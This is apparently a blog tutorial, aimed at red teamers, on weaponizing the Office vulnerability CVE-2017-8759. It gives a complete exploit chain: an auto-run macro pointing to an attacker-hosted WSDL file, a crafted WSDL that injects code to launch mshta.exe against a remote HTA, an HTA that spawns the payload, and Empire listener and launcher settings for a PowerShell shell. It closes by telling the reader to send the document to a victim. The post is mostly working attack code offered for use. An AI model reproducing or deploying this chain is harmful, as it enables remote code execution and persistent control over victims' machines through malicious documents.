---
layout: post
title: Exploiting CVE-2017-8759
---

<p></p>

FireEye have provided a detailed write-up on the vulnerability, so this won't go in to specifics of the vulnerability itself ([located here](https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html)), but rather exploiting it to get a foothold on the victim's network as a red teamer or pentester.

The broad tl;dr of the issue itself is:

*Office macro abuses the WSDL parser to get a hta file that is run by Word that runs the attacker's payload.*

In the terms of our attack, the flow looks like this:

1. Victim receives your malicious Office document. (SE ftw)
2. The user allows the macro to run, which downloads a .txt file from your server
3. This triggers the flaw which grabs a .hta from your server
4. The hta is then executed and gives you a shell.

---

Start off by creating an Office document with an auto run macro:

```csharp
Sub AutoOpen()
Set x = GetObject("soap:wsdl=http://<attacker ip>:<port>/exploit.txt")
End Sub
```

Next, create the exploit.txt file:
```csharp
<definitions
    xmlns="http://schemas.xmlsoap.org/wsdl/"
    xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
    xmlns:suds="http://www.w3.org/2000/wsdl/suds"
    xmlns:tns="http://schemas.microsoft.com/clr/ns/System"
    xmlns:ns0="http://schemas.microsoft.com/clr/nsassem/Logo/Logo">
    <portType name="PortType"/>
    <binding name="Binding" type="tns:PortType">
        <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
        <suds:class type="ns0:Image" rootType="MarshalByRefObject"></suds:class>
    </binding>
    <service name="Service">
        <port name="Port" binding="tns:Binding">
            <soap:address location="http://<attacker ip>:<port>?C:\Windows\System32\mshta.exe?http://<attacker ip>:<port>/cmd.hta"/>
                        <soap:address location=";
                        if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
                                System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
                                System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
                        } //"/>
        </port>
    </service>
</definitions>
```

Then in the same directory, create your cmd.hta file:
```csharp
<html>
<head>
<script language="VBScript">
Sub window_onload
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("WbemScripting.SWbemLocator")
	Set Service = Locator.ConnectServer()
	Service.Security_.ImpersonationLevel=impersonation
	Set objStartup = Service.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("<payload>", null, objConfig, intProcessID)
	window.close()
end sub
</script>
</head>
</html>
```

I prefer to use Empire for my payloads, as more often than not the Powershell will be executed without too many hassles, but you could use a meterpreter stager if you wished. Setup a http listener in Empire to use a powershell launcher but make sure the port it listens on is different to the one specified in your exploit.txt and cmd.hta files.

```
(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  Name              True        http                             Name for the listener.
  Launcher          True        powershell.exe -nop -sta -w 1 Launcher string.
                                -enc
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  StagingKey        True        5]!<ItA:y0cdeOZ8VhGHzgUn|&@a[9wj Staging key for initial agent negotiation.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  ServerVersion     True        Microsoft-IIS/7.5                Server header for the control server.
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  Host              True        http://<attacker ip>:<port>      Hostname/IP for staging.
  CertPath          False                                        Certificate path for https listeners.
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  Port              True        <port>                           Port for the listener.
  ```

Then, generate a launcher using stager/multi/launcher:
```
(Empire: stager/multi/launcher) > info

Name: Launcher

Description:
  Generates a one-liner stage0 launcher for Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True        http              Listener to generate stager for.
  OutFile          False                         File to output launcher to, otherwise
                                                 displayed on the screen.
  Proxy            False       default           Proxy to use for request (default, none,
                                                 or other).
  SafeChecks       True        True              Switch. Checks for LittleSnitch or a
                                                 SandBox, exit the staging process if
                                                 true. Defaults to True.
  Language         True        powershell        Language of the stager to generate.
  ProxyCreds       False       default           Proxy credentials
                                                 ([domain\]username:password) to use for
                                                 request (default, none, or other).
  UserAgent        False       default           User-agent string to use for the staging
                                                 request (default, none, or other).
  Base64           True        True              Switch. Base64 encode the output.
  StagerRetries    False       0                 Times for the stager to retry
                                                 connecting.
```
Enter the generated command in to your < payload > in the cmd.hta file created previously. Ensure you have a web server running on the port specified in the various files, and then send the document to your victim.
If all goes well, you'll get a shell shortly after the document is opened. From here, standard host enumeration can be performed re: privilege escalation etc.

Happy hacking folks.